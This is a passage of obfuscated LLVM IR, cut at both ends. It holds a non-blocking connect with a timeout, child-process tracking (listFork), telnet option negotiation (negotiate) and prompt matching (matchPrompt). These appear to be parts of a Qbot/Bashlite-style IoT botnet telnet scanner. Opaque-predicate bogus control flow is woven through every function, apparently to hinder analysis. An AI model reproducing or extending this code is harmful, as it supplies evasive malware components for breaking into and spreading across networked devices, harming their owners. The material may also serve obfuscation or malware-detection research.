  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  store i32 0, i32* %5, align 4
  %45 = load i32, i32* @x.41
  %46 = load i32, i32* @y.42
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %164

; <label>:53:                                     ; preds = %4
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %55 = getelementptr inbounds [8 x i8], [8 x i8]* %54, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 8, i32 4, i1 false)
  %56 = load i32, i32* %6, align 4
  %57 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %58 = call i32 @connect(i32 %56, %struct.sockaddr* %57, i32 16)
  store i32 %58, i32* %16, align 4
  %59 = load i32, i32* %16, align 4
  %60 = icmp slt i32 %59, 0
  br i1 %60, label %61, label %139

; <label>:61:                                     ; preds = %53
  %62 = call i32* @__errno_location() #13
  %63 = load i32, i32* %62, align 4
  %64 = icmp eq i32 %63, 115
  br i1 %64, label %65, label %137

; <label>:65:                                     ; preds = %61
  %66 = load i32, i32* @x.41
  %67 = load i32, i32* @y.42
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %65
  %74 = load i32, i32* %9, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %75, i64* %76, align 8
  %77 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %77, align 8
  %78 = load i32, i32* @x.41
  %79 = load i32, i32* @y.42
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %86

; <label>:86:                                     ; preds = %originalBBpart24
  %87 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %88 = getelementptr inbounds [16 x i64], [16 x i64]* %87, i64 0, i64 0
  %89 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %88) #2, !srcloc !3
  %90 = extractvalue { i64, i64* } %89, 0
  %91 = extractvalue { i64, i64* } %89, 1
  %92 = trunc i64 %90 to i32
  store i32 %92, i32* %17, align 4
  %93 = ptrtoint i64* %91 to i64
  %94 = trunc i64 %93 to i32
  store i32 %94, i32* %18, align 4
  br label %95

; <label>:95:                                     ; preds = %86
  %96 = load i32, i32* %6, align 4
  %97 = srem i32 %96, 64
  %98 = zext i32 %97 to i64
  %99 = shl i64 1, %98
  %100 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %101 = load i32, i32* %6, align 4
  %102 = sdiv i32 %101, 64
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds [16 x i64], [16 x i64]* %100, i64 0, i64 %103
  %105 = load i64, i64* %104, align 8
  %106 = or i64 %105, %99
  store i64 %106, i64* %104, align 8
  %107 = load i32, i32* %6, align 4
  %108 = add nsw i32 %107, 1
  %109 = call i32 @select(i32 %108, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %110 = icmp sgt i32 %109, 0
  br i1 %110, label %111, label %135

; <label>:111:                                    ; preds = %95
  %112 = load i32, i32* @x.41
  %113 = load i32, i32* @y.42
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %111
  store i32 4, i32* %13, align 4
  %120 = load i32, i32* %6, align 4
  %121 = bitcast i32* %14 to i8*
  %122 = call i32 @getsockopt(i32 %120, i32 1, i32 4, i8* %121, i32* %13) #2
  %123 = load i32, i32* %14, align 4
  %124 = icmp ne i32 %123, 0
  %125 = load i32, i32* @x.41
  %126 = load i32, i32* @y.42
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %124, label %133, label %134

; <label>:133:                                    ; preds = %originalBBpart28
  store i32 0, i32* %5, align 4
  br label %164

; <label>:134:                                    ; preds = %originalBBpart28
  br label %136

; <label>:135:                                    ; preds = %95
  store i32 0, i32* %5, align 4
  br label %164

; <label>:136:                                    ; preds = %134
  br label %138

; <label>:137:                                    ; preds = %61
  store i32 0, i32* %5, align 4
  br label %164

; <label>:138:                                    ; preds = %136
  br label %139

; <label>:139:                                    ; preds = %138, %53
  %140 = load i32, i32* @x.41
  %141 = load i32, i32* @y.42
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %139
  %148 = load i32, i32* %6, align 4
  %149 = call i32 (i32, i32, ...) @fcntl(i32 %148, i32 3, i8* null)
  %150 = sext i32 %149 to i64
  store i64 %150, i64* %15, align 8
  %151 = load i64, i64* %15, align 8
  %152 = and i64 %151, -2049
  store i64 %152, i64* %15, align 8
  %153 = load i32, i32* %6, align 4
  %154 = load i64, i64* %15, align 8
  %155 = call i32 (i32, i32, ...) @fcntl(i32 %153, i32 4, i64 %154)
  store i32 1, i32* %5, align 4
  %156 = load i32, i32* @x.41
  %157 = load i32, i32* @y.42
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart216, label %originalBB10alteredBB

originalBBpart216:                                ; preds = %originalBB10
  br label %164

; <label>:164:                                    ; preds = %originalBBpart216, %137, %135, %133, %originalBBpart2
  %165 = load i32, i32* %5, align 4
  ret i32 %165

originalBBalteredBB:                              ; preds = %originalBB, %36
  store i32 0, i32* %5, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %65
  %166 = load i32, i32* %9, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %167, i64* %168, align 8
  %169 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %169, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %111
  store i32 4, i32* %13, align 4
  %170 = load i32, i32* %6, align 4
  %171 = bitcast i32* %14 to i8*
  %172 = call i32 @getsockopt(i32 %170, i32 1, i32 4, i8* %171, i32* %13) #2
  %173 = load i32, i32* %14, align 4
  %174 = icmp ne i32 %173, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %139
  %175 = load i32, i32* %6, align 4
  %176 = call i32 (i32, i32, ...) @fcntl(i32 %175, i32 3, i8* null)
  %177 = sext i32 %176 to i64
  store i64 %177, i64* %15, align 8
  %178 = load i64, i64* %15, align 8
  %_ = sub i64 0, %178
  %gen = add i64 %_, -2049
  %_11 = sub i64 %178, -2049
  %gen12 = mul i64 %_11, -2049
  %_13 = sub i64 0, %178
  %gen14 = add i64 %_13, -2049
  %179 = and i64 %178, -2049
  store i64 %179, i64* %15, align 8
  %180 = load i32, i32* %6, align 4
  %181 = load i64, i64* %15, align 8
  %182 = call i32 (i32, i32, ...) @fcntl(i32 %180, i32 4, i64 %181)
  store i32 1, i32* %5, align 4
  br label %originalBB10
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = load i32, i32* @x.43
  %2 = load i32, i32* @y.44
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32*, align 8
  %12 = alloca i32, align 4
  %13 = call i32 @fork() #2
  store i32 %13, i32* %10, align 4
  %14 = load i32, i32* %10, align 4
  %15 = icmp ule i32 %14, 0
  %16 = load i32, i32* @x.43
  %17 = load i32, i32* @y.44
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %15, label %24, label %26

; <label>:24:                                     ; preds = %originalBBpart2
  %25 = load i32, i32* %10, align 4
  store i32 %25, i32* %9, align 4
  br label %127

; <label>:26:                                     ; preds = %originalBBpart2
  %27 = load i32, i32* @x.43
  %28 = load i32, i32* @y.44
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %26
  %35 = load i64, i64* @numpids, align 8
  %36 = add i64 %35, 1
  store i64 %36, i64* @numpids, align 8
  %37 = load i64, i64* @numpids, align 8
  %38 = add i64 %37, 1
  %39 = mul i64 %38, 4
  %40 = call noalias i8* @malloc(i64 %39) #2
  %41 = bitcast i8* %40 to i32*
  store i32* %41, i32** %11, align 8
  store i32 0, i32* %12, align 4
  %42 = load i32, i32* @x.43
  %43 = load i32, i32* @y.44
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart227, label %originalBB1alteredBB

originalBBpart227:                                ; preds = %originalBB1
  br label %50

; <label>:50:                                     ; preds = %originalBBpart247, %originalBBpart227
  %51 = load i32, i32* @x.43
  %52 = load i32, i32* @y.44
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %50
  %59 = load i32, i32* %12, align 4
  %60 = zext i32 %59 to i64
  %61 = load i64, i64* @numpids, align 8
  %62 = sub i64 %61, 1
  %63 = icmp ult i64 %60, %62
  %64 = load i32, i32* @x.43
  %65 = load i32, i32* @y.44
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart233, label %originalBB29alteredBB

originalBBpart233:                                ; preds = %originalBB29
  br i1 %63, label %72, label %117

; <label>:72:                                     ; preds = %originalBBpart233
  %73 = load i32, i32* @x.43
  %74 = load i32, i32* @y.44
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %72
  %81 = load i32*, i32** @pids, align 8
  %82 = load i32, i32* %12, align 4
  %83 = zext i32 %82 to i64
  %84 = getelementptr inbounds i32, i32* %81, i64 %83
  %85 = load i32, i32* %84, align 4
  %86 = load i32*, i32** %11, align 8
  %87 = load i32, i32* %12, align 4
  %88 = zext i32 %87 to i64
  %89 = getelementptr inbounds i32, i32* %86, i64 %88
  store i32 %85, i32* %89, align 4
  %90 = load i32, i32* @x.43
  %91 = load i32, i32* @y.44
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %98

; <label>:98:                                     ; preds = %originalBBpart237
  %99 = load i32, i32* @x.43
  %100 = load i32, i32* @y.44
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %98
  %107 = load i32, i32* %12, align 4
  %108 = add i32 %107, 1
  store i32 %108, i32* %12, align 4
  %109 = load i32, i32* @x.43
  %110 = load i32, i32* @y.44
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBBpart247, label %originalBB39alteredBB

originalBBpart247:                                ; preds = %originalBB39
  br label %50

; <label>:117:                                    ; preds = %originalBBpart233
  %118 = load i32, i32* %10, align 4
  %119 = load i32*, i32** %11, align 8
  %120 = load i64, i64* @numpids, align 8
  %121 = sub i64 %120, 1
  %122 = getelementptr inbounds i32, i32* %119, i64 %121
  store i32 %118, i32* %122, align 4
  %123 = load i32*, i32** @pids, align 8
  %124 = bitcast i32* %123 to i8*
  call void @free(i8* %124) #2
  %125 = load i32*, i32** %11, align 8
  store i32* %125, i32** @pids, align 8
  %126 = load i32, i32* %10, align 4
  store i32 %126, i32* %9, align 4
  br label %127

; <label>:127:                                    ; preds = %117, %24
  %128 = load i32, i32* %9, align 4
  ret i32 %128

originalBBalteredBB:                              ; preds = %originalBB, %0
  %129 = alloca i32, align 4
  %130 = alloca i32, align 4
  %131 = alloca i32*, align 8
  %132 = alloca i32, align 4
  %133 = call i32 @fork() #2
  store i32 %133, i32* %130, align 4
  %134 = load i32, i32* %130, align 4
  %135 = icmp ule i32 %134, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %26
  %136 = load i64, i64* @numpids, align 8
  %_ = sub i64 0, %136
  %gen = add i64 %_, 1
  %_2 = sub i64 0, %136
  %gen3 = add i64 %_2, 1
  %_4 = sub i64 0, %136
  %gen5 = add i64 %_4, 1
  %_6 = shl i64 %136, 1
  %137 = add i64 %136, 1
  store i64 %137, i64* @numpids, align 8
  %138 = load i64, i64* @numpids, align 8
  %_7 = sub i64 %138, 1
  %gen8 = mul i64 %_7, 1
  %_9 = shl i64 %138, 1
  %_10 = sub i64 0, %138
  %gen11 = add i64 %_10, 1
  %_12 = sub i64 0, %138
  %gen13 = add i64 %_12, 1
  %_14 = sub i64 0, %138
  %gen15 = add i64 %_14, 1
  %_16 = shl i64 %138, 1
  %_17 = shl i64 %138, 1
  %_18 = shl i64 %138, 1
  %139 = add i64 %138, 1
  %_19 = shl i64 %139, 4
  %_20 = sub i64 0, %139
  %gen21 = add i64 %_20, 4
  %_22 = sub i64 %139, 4
  %gen23 = mul i64 %_22, 4
  %_24 = sub i64 %139, 4
  %gen25 = mul i64 %_24, 4
  %140 = mul i64 %139, 4
  %141 = call noalias i8* @malloc(i64 %140) #2
  %142 = bitcast i8* %141 to i32*
  store i32* %142, i32** %11, align 8
  store i32 0, i32* %12, align 4
  br label %originalBB1

originalBB29alteredBB:                            ; preds = %originalBB29, %50
  %143 = load i32, i32* %12, align 4
  %144 = zext i32 %143 to i64
  %145 = load i64, i64* @numpids, align 8
  %_30 = sub i64 0, %145
  %gen31 = add i64 %_30, 1
  %146 = sub i64 %145, 1
  %147 = icmp ult i64 %144, %146
  br label %originalBB29

originalBB35alteredBB:                            ; preds = %originalBB35, %72
  %148 = load i32*, i32** @pids, align 8
  %149 = load i32, i32* %12, align 4
  %150 = zext i32 %149 to i64
  %151 = getelementptr inbounds i32, i32* %148, i64 %150
  %152 = load i32, i32* %151, align 4
  %153 = load i32*, i32** %11, align 8
  %154 = load i32, i32* %12, align 4
  %155 = zext i32 %154 to i64
  %156 = getelementptr inbounds i32, i32* %153, i64 %155
  store i32 %152, i32* %156, align 4
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %98
  %157 = load i32, i32* %12, align 4
  %_40 = shl i32 %157, 1
  %_41 = shl i32 %157, 1
  %_42 = shl i32 %157, 1
  %_43 = shl i32 %157, 1
  %_44 = sub i32 %157, 1
  %gen45 = mul i32 %_44, 1
  %158 = add i32 %157, 1
  store i32 %158, i32* %12, align 4
  br label %originalBB39
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %93 [
    i32 255, label %13
    i32 251, label %30
    i32 252, label %30
    i32 253, label %30
    i32 254, label %30
  ]

; <label>:13:                                     ; preds = %3
  %14 = load i32, i32* @x.45
  %15 = load i32, i32* @y.46
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  store i32 0, i32* %4, align 4
  %22 = load i32, i32* @x.45
  %23 = load i32, i32* @y.46
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %95

; <label>:30:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %31 = load i32, i32* %5, align 4
  %32 = call i64 @send(i32 %31, i8* %8, i64 1, i32 16384)
  %33 = load i8*, i8** %6, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 252, %36
  br i1 %37, label %38, label %39

; <label>:38:                                     ; preds = %30
  store i8 -2, i8* %8, align 1
  br label %86

; <label>:39:                                     ; preds = %30
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i64 1
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 254, %43
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %39
  store i8 -4, i8* %8, align 1
  br label %85

; <label>:46:                                     ; preds = %39
  %47 = load i8*, i8** %6, align 8
  %48 = getelementptr inbounds i8, i8* %47, i64 1
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 3, %50
  br i1 %51, label %52, label %60

; <label>:52:                                     ; preds = %46
  %53 = load i8*, i8** %6, align 8
  %54 = getelementptr inbounds i8, i8* %53, i64 1
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 253
  %58 = select i1 %57, i32 251, i32 253
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %8, align 1
  br label %84

; <label>:60:                                     ; preds = %46
  %61 = load i32, i32* @x.45
  %62 = load i32, i32* @y.46
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %60
  %69 = load i8*, i8** %6, align 8
  %70 = getelementptr inbounds i8, i8* %69, i64 1
  %71 = load i8, i8* %70, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 253
  %74 = select i1 %73, i32 252, i32 254
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %8, align 1
  %76 = load i32, i32* @x.45
  %77 = load i32, i32* @y.46
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %84

; <label>:84:                                     ; preds = %originalBBpart24, %52
  br label %85

; <label>:85:                                     ; preds = %84, %45
  br label %86

; <label>:86:                                     ; preds = %85, %38
  %87 = load i32, i32* %5, align 4
  %88 = call i64 @send(i32 %87, i8* %8, i64 1, i32 16384)
  %89 = load i32, i32* %5, align 4
  %90 = load i8*, i8** %6, align 8
  %91 = getelementptr inbounds i8, i8* %90, i64 2
  %92 = call i64 @send(i32 %89, i8* %91, i64 1, i32 16384)
  br label %94

; <label>:93:                                     ; preds = %3
  br label %94

; <label>:94:                                     ; preds = %93, %86
  store i32 0, i32* %4, align 4
  br label %95

; <label>:95:                                     ; preds = %94, %originalBBpart2
  %96 = load i32, i32* @x.45
  %97 = load i32, i32* @y.46
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %95
  %104 = load i32, i32* %4, align 4
  %105 = load i32, i32* @x.45
  %106 = load i32, i32* @y.46
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %104

originalBBalteredBB:                              ; preds = %originalBB, %13
  store i32 0, i32* %4, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %60
  %113 = load i8*, i8** %6, align 8
  %114 = getelementptr inbounds i8, i8* %113, i64 1
  %115 = load i8, i8* %114, align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 253
  %118 = select i1 %117, i32 252, i32 254
  %119 = trunc i32 %118 to i8
  store i8 %119, i8* %8, align 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %95
  %120 = load i32, i32* %4, align 4
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.22, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %originalBBpart231, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %164

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %122, %17
  %19 = load i32, i32* @x.47
  %20 = load i32, i32* @y.48
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %18
  %27 = load i32, i32* %5, align 4
  %28 = load i32, i32* %7, align 4
  %29 = icmp sgt i32 %27, %28
  %30 = load i32, i32* @x.47
  %31 = load i32, i32* @y.48
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %29, label %38, label %120

; <label>:38:                                     ; preds = %originalBBpart2
  %39 = load i8*, i8** %3, align 8
  %40 = load i32, i32* %5, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = sub i64 0, %44
  %46 = getelementptr inbounds i8, i8* %42, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = sext i8 %47 to i32
  %49 = icmp eq i32 %48, 0
  br i1 %49, label %118, label %50

; <label>:50:                                     ; preds = %38
  %51 = load i32, i32* @x.47
  %52 = load i32, i32* @y.48
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %50
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i32, i32* %7, align 4
  %64 = sext i32 %63 to i64
  %65 = sub i64 0, %64
  %66 = getelementptr inbounds i8, i8* %62, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 32
  %70 = load i32, i32* @x.47
  %71 = load i32, i32* @y.48
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart26, label %originalBB1alteredBB

originalBBpart26:                                 ; preds = %originalBB1
  br i1 %69, label %118, label %78

; <label>:78:                                     ; preds = %originalBBpart26
  %79 = load i8*, i8** %3, align 8
  %80 = load i32, i32* %5, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8, i8* %79, i64 %81
  %83 = load i32, i32* %7, align 4
  %84 = sext i32 %83 to i64
  %85 = sub i64 0, %84
  %86 = getelementptr inbounds i8, i8* %82, i64 %85
  %87 = load i8, i8* %86, align 1
  %88 = sext i8 %87 to i32
  %89 = icmp eq i32 %88, 13
  br i1 %89, label %118, label %90

; <label>:90:                                     ; preds = %78
  %91 = load i32, i32* @x.47
  %92 = load i32, i32* @y.48
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %90
  %99 = load i8*, i8** %3, align 8
  %100 = load i32, i32* %5, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8, i8* %99, i64 %101
  %103 = load i32, i32* %7, align 4
  %104 = sext i32 %103 to i64
  %105 = sub i64 0, %104
  %106 = getelementptr inbounds i8, i8* %102, i64 %105
  %107 = load i8, i8* %106, align 1
  %108 = sext i8 %107 to i32
  %109 = icmp eq i32 %108, 10
  %110 = load i32, i32* @x.47
  %111 = load i32, i32* @y.48
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
